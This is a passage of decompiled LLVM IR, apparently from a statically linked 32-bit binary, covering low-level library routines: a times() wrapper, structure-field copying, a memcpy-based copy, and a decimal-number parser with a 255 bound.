  %v2_80528a6 = inttoptr i32 %v1_805289f to i32*
  store i32 %v1_80528a4, i32* %v2_80528a6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80528af.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80528ab

dec_label_pc_80528ab:                             ; preds = %dec_label_pc_805287f, %dec_label_pc_805289f
  %v2_80528af = phi i32 [ %v0_805287f, %dec_label_pc_805287f ], [ %v2_80528af.pre, %dec_label_pc_805289f ]
  %v0_80528ab = phi i32 [ %v6_8052892, %dec_label_pc_805287f ], [ -1, %dec_label_pc_805289f ]
  store i32 %v2_80528af, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80528ab

; uselistorder directives
  uselistorder i32 %v6_8052892, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80528ab, { 1, 0 }
}

define i32 @function_80528b1(i32 %arg1) local_unnamed_addr {
dec_label_pc_80528b1:
  %stack_var_-12 = alloca i32, align 4
  %v0_80528b2 = load i32, i32* @ebx, align 4
  %v0_80528b6 = load i32, i32* @global_var_8054418.71, align 8
  %v1_80528b6 = icmp eq i32 %v0_80528b6, 0
  %v1_80528c1 = icmp eq i1 %v1_80528b6, false
  br i1 %v1_80528c1, label %dec_label_pc_80528d4, label %dec_label_pc_80528c3

dec_label_pc_80528c3:                             ; preds = %dec_label_pc_80528b1
  %v1_80528c8 = call i32 @function_8052a8f(i32 0)
  %v2_80528d0 = icmp slt i32 %v1_80528c8, 0
  br i1 %v2_80528d0, label %dec_label_pc_80528f6, label %dec_label_pc_80528c3.dec_label_pc_80528d4_crit_edge

dec_label_pc_80528c3.dec_label_pc_80528d4_crit_edge: ; preds = %dec_label_pc_80528c3
  %v0_80528d6.pre = load i32, i32* @global_var_8054418.71, align 8
  br label %dec_label_pc_80528d4

dec_label_pc_80528d4:                             ; preds = %dec_label_pc_80528c3.dec_label_pc_80528d4_crit_edge, %dec_label_pc_80528b1
  %v0_80528e4 = phi i32 [ %v0_80528d6.pre, %dec_label_pc_80528c3.dec_label_pc_80528d4_crit_edge ], [ %v0_80528b6, %dec_label_pc_80528b1 ]
  %v1_80528d4 = icmp eq i32 %arg1, 0
  %v1_80528db = icmp eq i1 %v1_80528d4, false
  store i32 %v0_80528e4, i32* @ebx, align 4
  br i1 %v1_80528db, label %dec_label_pc_80528e1, label %dec_label_pc_80528f9

dec_label_pc_80528e1:                             ; preds = %dec_label_pc_80528d4
  %v2_80528e6 = add i32 %v0_80528e4, %arg1
  %v1_80528ea = call i32 @function_8052a8f(i32 %v2_80528e6)
  %v2_80528f2 = icmp slt i32 %v1_80528ea, 0
  %v1_80528f4 = icmp eq i1 %v2_80528f2, false
  br i1 %v1_80528f4, label %dec_label_pc_80528e1.dec_label_pc_80528f9_crit_edge, label %dec_label_pc_80528f6

dec_label_pc_80528e1.dec_label_pc_80528f9_crit_edge: ; preds = %dec_label_pc_80528e1
  %v0_80528f9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80528f9

dec_label_pc_80528f6:                             ; preds = %dec_label_pc_80528e1, %dec_label_pc_80528c3
  br label %dec_label_pc_80528f9

dec_label_pc_80528f9:                             ; preds = %dec_label_pc_80528d4, %dec_label_pc_80528e1.dec_label_pc_80528f9_crit_edge, %dec_label_pc_80528f6
  %v0_80528f9 = phi i32 [ %v0_80528f9.pre, %dec_label_pc_80528e1.dec_label_pc_80528f9_crit_edge ], [ -1, %dec_label_pc_80528f6 ], [ %v0_80528e4, %dec_label_pc_80528d4 ]
  %v2_80528fb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80528fb, i32* @edx, align 4
  store i32 %v0_80528b2, i32* @ebx, align 4
  ret i32 %v0_80528f9

; uselistorder directives
  uselistorder i32 %v0_80528e4, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_8052a8f, { 1, 0 }
  uselistorder label %dec_label_pc_80528f9, { 2, 1, 0 }
}

define i32 @function_80528ff(%tms* %arg1) local_unnamed_addr {
dec_label_pc_80528ff:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80528ff = load i32, i32* @edi, align 4
  store i32 %v0_80528ff, i32* %stack_var_-4, align 4
  %v4_8052903 = ptrtoint %tms* %arg1 to i32
  store i32 %v4_8052903, i32* %edi.global-to-local, align 4
  %v0_8052907 = load i32, i32* @ebx, align 4
  %v3_805290f = call i32 @times(%tms* %arg1)
  store i32 %v3_805290f, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_805290f, -4095
  br i1 %tmp9, label %dec_label_pc_8052927, label %dec_label_pc_805291b

dec_label_pc_805291b:                             ; preds = %dec_label_pc_80528ff
  %v1_805291b = call i32 @function_805078b(i32 %v0_8052907)
  %v0_8052920 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052920 = sub i32 0, %v0_8052920
  %v2_8052922 = inttoptr i32 %v1_805291b to i32*
  store i32 %v1_8052920, i32* %v2_8052922, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_805292b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052927

dec_label_pc_8052927:                             ; preds = %dec_label_pc_80528ff, %dec_label_pc_805291b
  %v2_805292b = phi i32 [ %v0_80528ff, %dec_label_pc_80528ff ], [ %v2_805292b.pre, %dec_label_pc_805291b ]
  %v0_8052927 = phi i32 [ %v3_805290f, %dec_label_pc_80528ff ], [ -1, %dec_label_pc_805291b ]
  store i32 %v2_805292b, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052927

; uselistorder directives
  uselistorder i32 %v3_805290f, { 1, 0, 2 }
  uselistorder i32* @edi, { 5, 6, 7, 8, 9, 10, 159, 4, 164, 165, 172, 160, 0, 161, 162, 163, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 68, 69, 56, 57, 58, 59, 60, 61, 62, 1, 63, 64, 65, 66, 67, 170, 171, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 123, 22, 23, 24, 124, 125, 166, 167, 168, 169, 126, 127, 128, 129, 131, 132, 158, 114, 115, 116, 82, 83, 84, 85, 86, 87, 108, 109, 110, 111, 112, 113, 97, 98, 99, 103, 104, 105, 106, 107, 100, 101, 102, 133, 134, 135, 130, 136, 137, 138, 117, 25, 26, 27, 28, 29, 30, 118, 89, 88, 90, 91, 92, 93, 94, 95, 96, 119, 120, 121, 122, 139, 140, 141, 142, 143, 144, 145, 146, 147, 3, 148, 149, 150, 151, 152, 153, 154, 155, 157, 156, 2, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052927, { 1, 0 }
}

define i32 @function_805292d(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805292d:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805292e = load i32, i32* @ebx, align 4
  store i32 %v0_805292e, i32* %stack_var_-8, align 4
  %v4_8052932 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052932, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_805293f = inttoptr i32 %arg2 to i8*
  %v4_805293f = call i32 @function_80507dc(i8* %v3_805293f, i32 0, i32 88)
  store i32 %v4_805293f, i32* %eax.global-to-local, align 4
  %v2_8052944 = load i16, i16* %arg1, align 2
  %v3_8052944 = zext i16 %v2_8052944 to i32
  store i32 %v3_8052944, i32* %eax.global-to-local, align 4
  %v0_8052947 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052947 = add i32 %v0_8052947, 4
  %v2_8052947 = inttoptr i32 %v1_8052947 to i32*
  store i32 0, i32* %v2_8052947, align 4
  %v0_805294e = load i32, i32* %eax.global-to-local, align 4
  %v1_805294e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805294e = inttoptr i32 %v1_805294e to i32*
  store i32 %v0_805294e, i32* %v2_805294e, align 4
  %v0_8052950 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052950 = add i32 %v0_8052950, 4
  %v2_8052950 = inttoptr i32 %v1_8052950 to i32*
  %v3_8052950 = load i32, i32* %v2_8052950, align 4
  store i32 %v3_8052950, i32* %eax.global-to-local, align 4
  %v1_8052953 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052953 = add i32 %v1_8052953, 12
  %v3_8052953 = inttoptr i32 %v2_8052953 to i32*
  store i32 %v3_8052950, i32* %v3_8052953, align 4
  %v0_8052956 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052956 = add i32 %v0_8052956, 8
  %v2_8052956 = inttoptr i32 %v1_8052956 to i16*
  %v3_8052956 = load i16, i16* %v2_8052956, align 2
  %v4_8052956 = zext i16 %v3_8052956 to i32
  store i32 %v4_8052956, i32* %eax.global-to-local, align 4
  %v1_805295a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805295a = add i32 %v1_805295a, 16
  %v3_805295a = inttoptr i32 %v2_805295a to i32*
  store i32 %v4_8052956, i32* %v3_805295a, align 4
  %v0_805295d = load i32, i32* %esi.global-to-local, align 4
  %v1_805295d = add i32 %v0_805295d, 10
  %v2_805295d = inttoptr i32 %v1_805295d to i16*
  %v3_805295d = load i16, i16* %v2_805295d, align 2
  %v4_805295d = zext i16 %v3_805295d to i32
  store i32 %v4_805295d, i32* %eax.global-to-local, align 4
  %v1_8052961 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052961 = add i32 %v1_8052961, 20
  %v3_8052961 = inttoptr i32 %v2_8052961 to i32*
  store i32 %v4_805295d, i32* %v3_8052961, align 4
  %v0_8052964 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052964 = add i32 %v0_8052964, 12
  %v2_8052964 = inttoptr i32 %v1_8052964 to i16*
  %v3_8052964 = load i16, i16* %v2_8052964, align 2
  %v4_8052964 = zext i16 %v3_8052964 to i32
  store i32 %v4_8052964, i32* %eax.global-to-local, align 4
  %v1_8052968 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052968 = add i32 %v1_8052968, 24
  %v3_8052968 = inttoptr i32 %v2_8052968 to i32*
  store i32 %v4_8052964, i32* %v3_8052968, align 4
  %v0_805296b = load i32, i32* %esi.global-to-local, align 4
  %v1_805296b = add i32 %v0_805296b, 14
  %v2_805296b = inttoptr i32 %v1_805296b to i16*
  %v3_805296b = load i16, i16* %v2_805296b, align 2
  %v4_805296b = zext i16 %v3_805296b to i32
  store i32 %v4_805296b, i32* %eax.global-to-local, align 4
  %v1_805296f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805296f = add i32 %v1_805296f, 28
  %v3_805296f = inttoptr i32 %v2_805296f to i32*
  store i32 %v4_805296b, i32* %v3_805296f, align 4
  %v0_8052972 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052972 = add i32 %v0_8052972, 16
  %v2_8052972 = inttoptr i32 %v1_8052972 to i16*
  %v3_8052972 = load i16, i16* %v2_8052972, align 2
  %v4_8052972 = zext i16 %v3_8052972 to i32
  store i32 %v4_8052972, i32* %eax.global-to-local, align 4
  %v0_8052976 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052976 = add i32 %v0_8052976, 36
  %v2_8052976 = inttoptr i32 %v1_8052976 to i32*
  store i32 0, i32* %v2_8052976, align 4
  %v0_805297d = load i32, i32* %eax.global-to-local, align 4
  %v1_805297d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805297d = add i32 %v1_805297d, 32
  %v3_805297d = inttoptr i32 %v2_805297d to i32*
  store i32 %v0_805297d, i32* %v3_805297d, align 4
  %v0_8052980 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052980 = add i32 %v0_8052980, 20
  %v2_8052980 = inttoptr i32 %v1_8052980 to i32*
  %v3_8052980 = load i32, i32* %v2_8052980, align 4
  store i32 %v3_8052980, i32* %eax.global-to-local, align 4
  %v1_8052983 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052983 = add i32 %v1_8052983, 44
  %v3_8052983 = inttoptr i32 %v2_8052983 to i32*
  store i32 %v3_8052980, i32* %v3_8052983, align 4
  %v0_8052986 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052986 = add i32 %v0_8052986, 24
  %v2_8052986 = inttoptr i32 %v1_8052986 to i32*
  %v3_8052986 = load i32, i32* %v2_8052986, align 4
  store i32 %v3_8052986, i32* %eax.global-to-local, align 4
  %v1_8052989 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052989 = add i32 %v1_8052989, 48
  %v3_8052989 = inttoptr i32 %v2_8052989 to i32*
  store i32 %v3_8052986, i32* %v3_8052989, align 4
  %v0_805298c = load i32, i32* %esi.global-to-local, align 4
  %v1_805298c = add i32 %v0_805298c, 28
  %v2_805298c = inttoptr i32 %v1_805298c to i32*
  %v3_805298c = load i32, i32* %v2_805298c, align 4
  store i32 %v3_805298c, i32* %eax.global-to-local, align 4
  %v1_805298f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805298f = add i32 %v1_805298f, 52
  %v3_805298f = inttoptr i32 %v2_805298f to i32*
  store i32 %v3_805298c, i32* %v3_805298f, align 4
  %v0_8052992 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052992 = add i32 %v0_8052992, 32
  %v2_8052992 = inttoptr i32 %v1_8052992 to i32*
  %v3_8052992 = load i32, i32* %v2_8052992, align 4
  store i32 %v3_8052992, i32* %eax.global-to-local, align 4
  %v1_8052995 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052995 = add i32 %v1_8052995, 56
  %v3_8052995 = inttoptr i32 %v2_8052995 to i32*
  store i32 %v3_8052992, i32* %v3_8052995, align 4
  %v0_8052998 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052998 = add i32 %v0_8052998, 40
  %v2_8052998 = inttoptr i32 %v1_8052998 to i32*
  %v3_8052998 = load i32, i32* %v2_8052998, align 4
  store i32 %v3_8052998, i32* %eax.global-to-local, align 4
  %v1_805299b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805299b = add i32 %v1_805299b, 64
  %v3_805299b = inttoptr i32 %v2_805299b to i32*
  store i32 %v3_8052998, i32* %v3_805299b, align 4
  %v0_805299e = load i32, i32* %esi.global-to-local, align 4
  %v1_805299e = add i32 %v0_805299e, 48
  %v2_805299e = inttoptr i32 %v1_805299e to i32*
  %v3_805299e = load i32, i32* %v2_805299e, align 4
  store i32 %v3_805299e, i32* %eax.global-to-local, align 4
  %v1_80529a1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80529a1 = add i32 %v1_80529a1, 72
  %v3_80529a1 = inttoptr i32 %v2_80529a1 to i32*
  store i32 %v3_805299e, i32* %v3_80529a1, align 4
  %v2_80529a7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80529a7, i32* @ebx, align 4
  ret i32 %v3_805299e

; uselistorder directives
  uselistorder i32 72, { 2, 1, 3, 0 }
  uselistorder i32 64, { 5, 4, 3, 6, 0, 1, 2 }
  uselistorder i32 40, { 3, 2, 4, 0, 5, 6, 7, 1 }
  uselistorder i32 56, { 5, 4, 0, 1, 2, 3 }
  uselistorder i32 52, { 4, 3, 5, 6, 1, 2, 0 }
  uselistorder i32 48, { 11, 12, 10, 4, 9, 8, 0, 6, 2, 1, 7, 5, 13, 3 }
  uselistorder i32 32, { 29, 30, 64, 19, 28, 62, 63, 35, 36, 37, 1, 0, 2, 3, 23, 4, 5, 6, 7, 8, 58, 52, 53, 26, 42, 24, 51, 46, 47, 25, 50, 48, 49, 54, 55, 31, 32, 33, 34, 56, 43, 27, 44, 45, 57, 18, 59, 10, 9, 12, 11, 13, 14, 21, 20, 60, 61, 38, 39, 15, 40, 17, 16, 22, 41 }
  uselistorder i32 36, { 3, 2, 0, 1 }
  uselistorder i32 14, { 3, 0, 2, 1 }
  uselistorder i32 24, { 12, 13, 10, 18, 19, 20, 11, 14, 15, 0, 1, 8, 36, 31, 21, 28, 29, 6, 26, 3, 37, 32, 7, 16, 5, 17, 33, 22, 4, 23, 24, 25, 27, 30, 34, 35, 38, 39, 40, 42, 41, 9, 2 }
  uselistorder i32 20, { 13, 14, 4, 11, 18, 19, 20, 12, 15, 16, 17, 0, 1, 10, 21, 8, 5, 9, 7, 6, 22, 23, 24, 2, 3 }
  uselistorder i32 16, { 40, 41, 33, 34, 35, 36, 37, 38, 15, 32, 74, 5, 43, 44, 45, 2, 6, 46, 47, 8, 7, 48, 3, 9, 39, 42, 16, 20, 31, 11, 12, 27, 49, 50, 10, 61, 62, 28, 0, 21, 25, 1, 22, 63, 26, 24, 29, 13, 23, 64, 65, 66, 67, 68, 69, 70, 30, 71, 4, 72, 17, 51, 52, 53, 54, 55, 56, 57, 58, 59, 19, 14, 60, 18, 73 }
  uselistorder i32 8, { 38, 27, 28, 29, 30, 31, 32, 33, 34, 16, 112, 17, 113, 24, 18, 25, 44, 45, 46, 47, 48, 49, 50, 3, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 4, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 20, 5, 21, 6, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 19, 92, 93, 7, 94, 95, 96, 97, 8, 98, 35, 36, 37, 39, 111, 103, 104, 105, 22, 1, 2, 40, 41, 42, 43, 26, 106, 107, 108, 109, 10, 110, 99, 100, 101, 102, 11, 12, 13, 14, 15, 9, 23, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_80507dc, { 1, 4, 3, 2, 0 }
}

define i32 @function_80529aa(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80529aa:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80529ab = load i32, i32* @esi, align 4
  store i32 %v0_80529ab, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_80529ac = sdiv i32 %sext, 16777216
  store i32 %v4_80529ac, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80529b6 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80529b6, i32* %edi.global-to-local, align 4
  %v2_80529ba = udiv i32 %v4_80529ac, 4
  %v3_80529bd = inttoptr i32 %arg2 to i8*
  %v4_80529bd = bitcast i16* %arg1 to i8*
  %v5_80529bd = call i8* @_memcpy(i8* %v4_80529bd, i8* %v3_80529bd, i32 %v2_80529ba)
  %v0_80529bf = load i32, i32* %eax.global-to-local, align 4
  %v2_80529bf = and i32 %v0_80529bf, 2
  %v3_80529bf = icmp eq i32 %v2_80529bf, 0
  br i1 %v3_80529bf, label %dec_label_pc_80529c5, label %dec_label_pc_80529c3

dec_label_pc_80529c3:                             ; preds = %dec_label_pc_80529aa
  %v0_80529c3 = load i32, i32* %esi.global-to-local, align 4
  %v1_80529c3 = inttoptr i32 %v0_80529c3 to i16*
  %v2_80529c3 = load i16, i16* %v1_80529c3, align 2
  %v3_80529c3 = load i32, i32* %edi.global-to-local, align 4
  %v4_80529c3 = inttoptr i32 %v3_80529c3 to i16*
  store i16 %v2_80529c3, i16* %v4_80529c3, align 2
  %v5_80529c3 = load i32, i32* %edi.global-to-local, align 4
  %v6_80529c3 = load i32, i32* %esi.global-to-local, align 4
  %v7_80529c3 = load i1, i1* @df, align 1
  %v8_80529c3 = select i1 %v7_80529c3, i32 -2, i32 2
  %v9_80529c3 = add i32 %v8_80529c3, %v5_80529c3
  %v10_80529c3 = add i32 %v8_80529c3, %v6_80529c3
  store i32 %v9_80529c3, i32* %edi.global-to-local, align 4
  store i32 %v10_80529c3, i32* %esi.global-to-local, align 4
  %v0_80529c5.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529c5

dec_label_pc_80529c5:                             ; preds = %dec_label_pc_80529aa, %dec_label_pc_80529c3
  %v0_80529c5 = phi i32 [ %v0_80529bf, %dec_label_pc_80529aa ], [ %v0_80529c5.pre, %dec_label_pc_80529c3 ]
  %v2_80529c5 = urem i32 %v0_80529c5, 2
  %v3_80529c5 = icmp eq i32 %v2_80529c5, 0
  br i1 %v3_80529c5, label %dec_label_pc_80529ca, label %dec_label_pc_80529c9

dec_label_pc_80529c9:                             ; preds = %dec_label_pc_80529c5
  %v0_80529c9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80529c9 = inttoptr i32 %v0_80529c9 to i8*
  %v2_80529c9 = load i8, i8* %v1_80529c9, align 1
  %v3_80529c9 = load i32, i32* %edi.global-to-local, align 4
  %v4_80529c9 = inttoptr i32 %v3_80529c9 to i8*
  store i8 %v2_80529c9, i8* %v4_80529c9, align 1
  %v5_80529c9 = load i32, i32* %edi.global-to-local, align 4
  %v6_80529c9 = load i32, i32* %esi.global-to-local, align 4
  %v7_80529c9 = load i1, i1* @df, align 1
  %v8_80529c9 = select i1 %v7_80529c9, i32 -1, i32 1
  %v9_80529c9 = add i32 %v8_80529c9, %v5_80529c9
  %v10_80529c9 = add i32 %v8_80529c9, %v6_80529c9
  store i32 %v9_80529c9, i32* %edi.global-to-local, align 4
  store i32 %v10_80529c9, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80529ca

dec_label_pc_80529ca:                             ; preds = %dec_label_pc_80529c5, %dec_label_pc_80529c9
  store i32 %v4_80529b6, i32* %eax.global-to-local, align 4
  %v2_80529ce = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80529ce, i32* @esi, align 4
  ret i32 %v4_80529b6

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 5, 2, 3, 4, 0, 1 }
  uselistorder i1* @df, { 5, 6, 1, 0, 3, 4, 2 }
  uselistorder i32 4, { 3, 36, 37, 28, 29, 30, 31, 167, 168, 173, 174, 0, 178, 179, 180, 169, 15, 23, 170, 172, 175, 177, 50, 51, 52, 53, 54, 55, 4, 56, 57, 58, 59, 60, 61, 62, 63, 48, 49, 64, 17, 65, 66, 67, 68, 69, 70, 71, 5, 73, 72, 74, 6, 75, 16, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 8, 96, 97, 99, 98, 7, 176, 171, 27, 20, 32, 33, 34, 35, 38, 133, 134, 21, 100, 101, 22, 103, 104, 105, 143, 144, 145, 140, 141, 114, 115, 116, 135, 136, 137, 1, 138, 139, 123, 124, 125, 129, 130, 2, 131, 132, 126, 127, 128, 146, 147, 39, 40, 41, 42, 43, 44, 45, 46, 47, 117, 118, 119, 120, 121, 122, 142, 24, 148, 149, 150, 151, 153, 154, 152, 155, 158, 159, 160, 156, 157, 18, 166, 9, 161, 19, 162, 163, 164, 165, 106, 107, 108, 25, 109, 110, 10, 111, 112, 113, 11, 12, 13, 14, 102, 181, 26 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7 }
  uselistorder i32* @esi, { 108, 109, 29, 30, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 18, 19, 110, 111, 6, 112, 113, 114, 125, 128, 129, 130, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 31, 35, 2, 36, 37, 38, 39, 40, 41, 42, 32, 33, 34, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 0, 65, 66, 67, 68, 3, 69, 5, 70, 71, 72, 73, 7, 97, 98, 20, 4, 21, 22, 23, 24, 25, 126, 127, 99, 100, 26, 74, 75, 76, 88, 92, 93, 94, 90, 91, 27, 28, 95, 89, 96, 101, 102, 103, 104, 105, 106, 107, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 131 }
  uselistorder label %dec_label_pc_80529ca, { 1, 0 }
  uselistorder label %dec_label_pc_80529c5, { 1, 0 }
}

define i32 @function_80529d1(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80529d1:
  %v1_80529dc = icmp eq i8* %arg1, null
  br i1 %v1_80529dc, label %dec_label_pc_8052a5d, label %dec_label_pc_80529e0

dec_label_pc_80529e0:                             ; preds = %dec_label_pc_80529d1
  %v4_80529d8 = ptrtoint i8* %arg1 to i32
  %v0_80529ee.pre = load i32, i32* bitcast (i32** @global_var_805434c.72 to i32*), align 4
  br label %dec_label_pc_80529eb

dec_label_pc_80529eb:                             ; preds = %dec_label_pc_80529e0, %dec_label_pc_8052a34
  %v0_8052a34 = phi i32 [ 0, %dec_label_pc_80529e0 ], [ %v2_8052a3a, %dec_label_pc_8052a34 ]
  %v2_8052a37 = phi i32 [ 1, %dec_label_pc_80529e0 ], [ %v3_8052a37, %dec_label_pc_8052a34 ]
  %v0_80529eb = phi i32 [ %v4_80529d8, %dec_label_pc_80529e0 ], [ %v0_80529eb3, %dec_label_pc_8052a34 ]
  %v1_80529eb = inttoptr i32 %v0_80529eb to i8*
  %v2_80529eb = load i8, i8* %v1_80529eb, align 1
  %v3_80529eb = sext i8 %v2_80529eb to i32
  %v2_80529f4 = mul nsw i32 %v3_80529eb, 2
  %v3_80529f4 = add i32 %v2_80529f4, %v0_80529ee.pre
  %v4_80529f4 = inttoptr i32 %v3_80529f4 to i8*
  %v5_80529f4 = load i8, i8* %v4_80529f4, align 1
  %v6_80529f4 = and i8 %v5_80529f4, 8
  %v7_80529f4 = icmp eq i8 %v6_80529f4, 0
  br i1 %v7_80529f4, label %dec_label_pc_8052a5d, label %dec_label_pc_80529fb

dec_label_pc_80529fb:                             ; preds = %dec_label_pc_80529eb
  %v4_8052a0f.pre = load i32, i32* @edx, align 4
  %v2_8052a0f34 = load i8, i8* %v1_80529eb, align 1
  %v3_8052a0f35 = zext i8 %v2_8052a0f34 to i32
  %v5_8052a0f36 = and i32 %v4_8052a0f.pre, -256
  %v6_8052a0f37 = or i32 %v3_8052a0f35, %v5_8052a0f36
  store i32 %v6_8052a0f37, i32* @edx, align 4
  %v2_8052a1138 = sext i8 %v2_8052a0f34 to i32
  %v2_8052a1439 = mul nsw i32 %v2_8052a1138, 2
  %v3_8052a1440 = add i32 %v2_8052a1439, %v0_80529ee.pre
  %v4_8052a1441 = inttoptr i32 %v3_8052a1440 to i16*
  %v5_8052a1442 = load i16, i16* %v4_8052a1441, align 2
  %v2_8052a1944 = and i16 %v5_8052a1442, 8
  %v3_8052a1945 = icmp eq i16 %v2_8052a1944, 0
  %v1_8052a1b46 = icmp eq i1 %v3_8052a1945, false
  br i1 %v1_8052a1b46, label %dec_label_pc_80529ff, label %dec_label_pc_8052a1d

dec_label_pc_80529ff:                             ; preds = %dec_label_pc_80529fb, %dec_label_pc_8052a0e
  %v2_8052a1150 = phi i32 [ %v2_8052a11, %dec_label_pc_8052a0e ], [ %v2_8052a1138, %dec_label_pc_80529fb ]
  %v6_8052a0f49 = phi i32 [ %v6_8052a0f, %dec_label_pc_8052a0e ], [ %v6_8052a0f37, %dec_label_pc_80529fb ]
  %v0_8052a0e48 = phi i32 [ %v1_8052a0e, %dec_label_pc_8052a0e ], [ %v0_80529eb, %dec_label_pc_80529fb ]
  %v1_80529ff47 = phi i32 [ %v3_8052a02, %dec_label_pc_8052a0e ], [ 0, %dec_label_pc_80529fb ]
  %v3_80529ff = mul i32 %v1_80529ff47, 10
  %v2_8052a02 = add i32 %v3_80529ff, -48
  %v3_8052a02 = add i32 %v2_8052a02, %v2_8052a1150
  %v1_8052a06 = add i32 %v3_8052a02, -255
  %v6_8052a06 = sub i32 254, %v3_8052a02
  %v7_8052a06 = and i32 %v6_8052a06, %v3_8052a02
  %v8_8052a06 = icmp slt i32 %v7_8052a06, 0
  %v9_8052a06 = icmp eq i32 %v1_8052a06, 0
  %v10_8052a06 = icmp slt i32 %v1_8052a06, 0
  %v3_8052a0c = icmp eq i1 %v10_8052a06, %v8_8052a06
  %v4_8052a0c = icmp eq i1 %v9_8052a06, false
  %v5_8052a0c = and i1 %v4_8052a0c, %v3_8052a0c
  br i1 %v5_8052a0c, label %dec_label_pc_8052a5d, label %dec_label_pc_8052a0e

dec_label_pc_8052a0e:                             ; preds = %dec_label_pc_80529ff
  %v1_8052a0e = add i32 %v0_8052a0e48, 1
  %v1_8052a0f = inttoptr i32 %v1_8052a0e to i8*
  %v2_8052a0f = load i8, i8* %v1_8052a0f, align 1
  %v3_8052a0f = zext i8 %v2_8052a0f to i32
  %v5_8052a0f = and i32 %v6_8052a0f49, -256
  %v6_8052a0f = or i32 %v3_8052a0f, %v5_8052a0f
  store i32 %v6_8052a0f, i32* @edx, align 4
  %v2_8052a11 = sext i8 %v2_8052a0f to i32
  %v2_8052a14 = mul nsw i32 %v2_8052a11, 2
  %v3_8052a14 = add i32 %v2_8052a14, %v0_80529ee.pre
  %v4_8052a14 = inttoptr i32 %v3_8052a14 to i16*
  %v5_8052a14 = load i16, i16* %v4_8052a14, align 2
  %v2_8052a19 = and i16 %v5_8052a14, 8
  %v3_8052a19 = icmp eq i16 %v2_8052a19, 0
  %v1_8052a1b = icmp eq i1 %v3_8052a19, false
  br i1 %v1_8052a1b, label %dec_label_pc_80529ff, label %dec_label_pc_8052a1d

dec_label_pc_8052a1d:                             ; preds = %dec_label_pc_8052a0e, %dec_label_pc_80529fb
